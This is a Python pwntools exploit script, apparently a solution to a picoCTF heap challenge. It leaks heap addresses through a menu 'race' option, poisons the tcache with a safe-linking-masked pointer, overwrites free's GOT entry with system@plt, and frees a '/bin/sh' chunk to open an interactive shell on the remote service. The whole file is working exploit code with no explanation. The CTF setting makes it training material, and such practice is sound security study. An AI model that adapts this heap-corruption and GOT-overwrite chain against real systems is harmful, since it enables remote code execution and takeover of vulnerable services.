from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'saturn.picoctf.net', 59657
r = remote(HOST, PORT)

def add(idx, name_length, data):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'? ', str(idx).encode())
    r.sendlineafter(b'? ', f'{name_length}'.encode())
    r.sendlineafter(b': ', data)

def free(idx):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'? ', str(idx).encode())

def race():
    r.sendlineafter(b'Choice: ', b'3')

def cheat(idx, data):
    r.sendlineafter(b'Choice: ', b'0')
    r.sendlineafter(b'? ', str(idx).encode())
    r.sendlineafter(b': ', data)
    r.sendlineafter(b'? ', b'0')

for i in range(12):
    add(i, 256, b'\xff')
for i in range(11, -1, -1):
    free(i)
for i in range(12):
    add(i, 256, b'\xff')

race()

heap_leaks = r.recvuntil(b'WINNER').splitlines()[:12]
heap_leaks = [u64(val.strip(b' |').ljust(8, b'\x00')) for val in heap_leaks]
heap_base = (heap_leaks[7] - 1) << 12
log.success(f'Heap base: {hex(heap_base)}')

free_got = 0x404018
system_plt = 0x401090

masked_ptr = (heap_base >> 12) ^ (free_got-8)

free(6)
free(7)

cheat(7, p64(masked_ptr) + b'\xff')

add(15, 256, b'/bin/sh\x00' + b'\xff')
add(16, 256, p64(system_plt) + p64(system_plt) + b'\xff')

free(15)

r.interactive()